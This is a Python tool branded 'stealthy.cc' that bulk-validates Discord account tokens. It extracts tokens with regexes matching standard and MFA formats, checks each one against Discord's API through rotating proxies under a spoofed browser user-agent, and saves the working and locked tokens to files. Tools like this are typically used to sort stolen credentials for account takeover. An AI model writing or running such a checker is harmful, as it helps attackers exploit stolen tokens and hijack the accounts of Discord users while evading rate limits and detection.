import os, asyncio, httpx, ctypes, threading
from colorama import Fore, init
from itertools import cycle
from tasksio import TaskPool
from re import findall

init(autoreset=True)

# File Check
if not os.path.exists('Data'):
    os.makedirs('Data')
items = ['Data/tokens.txt', 'Data/locked.txt', 'Data/valid.txt', 'Data/proxies.txt']
for item in items:
    if not os.path.isfile(item):
        open(item, 'w')

# Colour Vars
Y = Fore.YELLOW
R = Fore.RED
G = Fore.GREEN
RE = Fore.RESET

# Token Vars
valid = []
invalid = []
locked = []

# Proxy Check
try:
    with open('Data/proxies.txt', 'r') as f:
        proxies = list(cycle(f.read().splitlines()))
    if not proxies:
        proxies = []
except Exception:
    proxies = []

# Proxy Cycle
def get_proxy_dict():
    if len(proxies) > 0:
        proxy = next(proxies)
        return {'http': proxy, 'https': proxy}
    return {}

CLIENT = httpx.AsyncClient(
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
        'content-type': 'application/json'
    },
    proxies=get_proxy_dict()
)

def changeTitle():
    while True:
        ctypes.windll.kernel32.SetConsoleTitleW("stealthy.cc | valid: {} | locked: {} | invalid: {}".format(len(set(valid)), len(set(locked)), len(set(invalid))))

'''

  ██████ ▄▄▄█████▓▓█████ ▄▄▄       ██▓  ▄▄▄█████▓ ██░ ██▓██   ██▓      ▄████▄   ▄████▄  
▒██    ▒ ▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒  ▓  ██▒ ▓▒▓██░ ██▒▒██  ██▒     ▒██▀ ▀█  ▒██▀ ▀█  
░ ▓██▄   ▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▒██░  ▒ ▓██░ ▒░▒██▀▀██░ ▒██ ██░     ▒▓█    ▄ ▒▓█    ▄ 
  ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██░  ░ ▓██▓ ░ ░▓█ ░██  ░ ▐██▓░     ▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒
▒██████▒▒  ▒██▒ ░ ░▒████▒▓█   ▓██▒░██████▒▒██▒ ░ ░▓█▒░██▓ ░ ██▒▓░ ██▓ ▒ ▓███▀ ░▒ ▓███▀ ░
▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░▓  ░▒ ░░    ▒ ░░▒░▒  ██▒▒▒  ▒▓▒ ░ ░▒ ▒  ░░ ░▒ ▒  ░
░ ░▒  ░ ░    ░     ░ ░  ░ ▒   ▒▒ ░░ ░ ▒  ░  ░     ▒ ░▒░ ░▓██ ░▒░  ░▒    ░  ▒     ░  ▒   
░  ░  ░    ░         ░    ░   ▒     ░ ░   ░       ░  ░░ ░▒ ▒ ░░   ░   ░        ░        
      ░              ░  ░     ░  ░    ░  ░        ░  ░  ░░ ░       ░  ░ ░      ░ ░      
                                                         ░ ░       ░  ░        ░        

'''

async def check(token: str):
    headers = {
        'Authorization': token, 
        'Content-Type': 'application/json'
    }
    r = await CLIENT.get('https://discord.com/api/v9/users/@me/library', 
        headers=headers)
    
    if(r.status_code == 401):
        invalid.append(token)
        print('{}{} {}- invalid'.format(R, token, RE))
    elif('You need to verify' in r.text):
        locked.append(token)
        print('{}{} {}- locked'.format(Y, token, RE))
    elif(r.status_code == 200):
        valid.append(token)
        print('{}{} {}- valid'.format(G, token, RE))
    else:
        print(r.status_code)

async def tokencheck():
    global valid, locked, invalid
    tokens = []
    os.system('cls')
    
    with open('Data/tokens.txt', 'r') as f:
        tokenstxt = f.read().splitlines()

        for line in [t.strip() for t in tokenstxt if t.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in findall(regex, line):
                    if token not in tokens:
                        tokens.append(token)
    async with TaskPool(15000) as pool:
        for token in tokens:
            await check(token)
    
    with open('Data/valid.txt', 'w') as f:
        val = set(valid)
        f.write('\n'.join(val))
        f.close()

    with open('Data/locked.txt', 'w') as f:
        lock = set(locked)
        f.write('\n'.join(lock))
        f.close()

    input('\nvalid: {}{} {}locked: {}{} {}invalid: {}{}{}\n\nAll valid and locked tokens were saved in the "Data" folder'.format(G, len(val), RE, Y, len(lock), RE, R, len(set(invalid)), RE))

if __name__ == '__main__':
    threading.Thread(target=changeTitle, daemon=True).start()
    loop = asyncio.get_event_loop()
    loop.run_until_complete(tokencheck())
